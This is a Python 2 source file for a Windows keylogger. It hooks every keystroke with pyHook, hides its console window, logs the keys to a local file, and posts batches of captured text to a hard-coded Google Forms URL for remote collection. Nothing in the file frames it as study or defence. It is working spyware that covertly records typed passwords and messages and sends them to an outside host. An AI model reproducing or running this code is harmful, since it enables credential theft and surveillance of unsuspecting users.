try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import os
import sys
import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime,time
import win32event, win32api, winerror
import socket

mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)
x=''
data=''
datalocal=''
dataremote=''
count=0

REMOTE_SERVER = "www.google.com"

def is_connected():
  try:
    host = socket.gethostbyname(REMOTE_SERVER)
    s = socket.create_connection((host, 80), 2)
    return True
  except:
     pass
  return False

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True
def msg():
    print "DannyTech Security."
    return True


def local():
    global datalocal
    
    if len(datalocal)>10:
        fp=open("klogs.txt","a")
        fp.write(datalocal)
        fp.close()
        datalocal=''
        #print "data ready to send..."
    return True

def remote():
    global dataremote
    if len(dataremote)>500:
        url="https://docs.google.com/forms/d/1Ebe2ERl7xOasb78yy8dcaj2um5YkRlUdh36UhLIdVrI/formResponse?pli=1" 
        klog={'entry.580880846':dataremote} 
        try:
            #print "Sending Data to Server!!"
            dataenc=urllib.urlencode(klog)
            req=urllib2.Request(url,dataenc)
            response=urllib2.urlopen(req)
            dataremote=''
            
        except Exception as e:
            print e
        except urllib2.URLError, e:
            
            if isinstance(e.reason, socket.timeout):
                raise MyException("There was an error: %r" % e)
            else:
                
                raise
        except socket.timeout, e:
            
            raise MyException("There was an error: %r" % e)
    return True


def keypressed(event):
    global x,data,datalocal,dataremote
    if event.Ascii==13:
        keys='<ENTR>'
    elif event.Ascii==8:
        keys='<BKSPS>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys
    datalocal=datalocal+keys
    dataremote = dataremote+keys
    local()
    if(is_connected()==True):
        remote()
    #writedata()
hide()
obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
